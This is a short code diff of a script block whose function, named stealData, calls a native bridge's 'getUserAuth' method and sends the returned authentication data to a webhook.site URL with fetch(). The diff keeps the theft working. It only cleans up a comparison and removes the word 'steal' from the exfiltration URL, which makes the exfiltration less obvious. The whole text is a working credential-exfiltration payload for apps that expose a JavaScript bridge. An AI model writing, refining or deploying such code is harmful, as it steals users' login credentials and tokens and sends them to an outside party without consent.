@@ -1,8 +1,8 @@
 <script>
     function stealData() {
-        if(typeof bridge != "undefined"){
+        if(typeof bridge !== "undefined"){
             bridge.call("getUserAuth", {}, function(resp) {
-                fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?steal?data=" + encodeURIComponent(JSON.stringify(resp)));
+                fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?data=" + encodeURIComponent(JSON.stringify(resp)));
             });
         } else {
             console.log("bridge not found");
